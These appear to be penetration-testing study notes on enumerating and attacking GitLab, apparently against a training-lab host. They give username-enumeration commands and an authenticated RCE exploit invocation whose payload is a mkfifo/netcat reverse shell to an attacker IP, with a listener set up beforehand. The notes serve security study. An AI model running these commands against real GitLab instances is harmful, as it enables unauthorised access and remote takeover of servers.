---
title: GitLab Enumeration and Attack Techniques
aliases: []
tags:
- study-notes
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: gitlab.md
related_tools:
- '[[searchsploit]]'
- '[[python3]]'
- '[[nc]]'
- '[[djvulibre-bin]]'
- '[[49951.py]]'
related_techniques:
- '[[T1008]]'
- '[[t1190]]'
related_tactics:
- '[[ta0003]]'
related_services:
- '[[http]]'
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# GitLab Enumeration and Attack Techniques

## Description
GitLab is a web-based Git-repository hosting tool that provides wiki capabilities, issue tracking, and continuous integration and deployment pipeline functionality. It is used to look for SSH private keys, users, passwords, and data. Breach lists can be used for potential credentials, and two-factor authentication is disabled by default.

## Discovery
- The version number can only be obtained by browsing the `/help` page after logging in.
- If you cannot create an account, try the following URL: https://www.exploit-db.com/exploits/49821.

## Enumeration
- Without knowing the version number or having a login, there is not much to target.
- If you have a login, you can check the `/explore` page to see the projects.
- Check groups, snippets, and help.
- For self-managed instances, you can try username or email address enumeration.

## Attack Techniques
- **Username Enumeration**
  - Use the following exploit: https://www.exploit-db.com/exploits/49821
  - Command: `searchsploit -m ruby/webapps/49821.sh`
  - Command: `./49821.sh -u http://gitlab.inlanefreight.local:8081 --userlist /usr/share/seclists/Usernames/cirt-default-usernames.txt`
  - Use the following Python script: https://github.com/dpgg101/GitLabUserEnum
  - Command: `python3 ./gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081 --wordlist /usr/share/seclists/Usernames/cirt-default-usernames.txt -v`
  - Note: In versions below 16.6, GitLab's defaults are set to 10 failed login attempts, resulting in an automatic unlock after 10 minutes. Versions post this can be configured.
- **Remote Code Execution**
  - GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution.
  - URL: https://www.exploit-db.com/exploits/49951
  - Command: `nc -nlvp 8443`
  - Command: `sudo apt install djvulibre-bin`
  - Command: `python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u auser -p Password123 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.50 8443 >/tmp/f '`
  - Note: Requires a valid username and password, but if self-hosted, try registering.

## References
- https://about.gitlab.com/
- https://tillsongalloway.com/finding-sensitive-information-on-github/index.html
- https://www.exploit-db.com/exploits/49821
- https://hackerone.com/reports/1154542
- https://www.exploit-db.com/exploits/49951

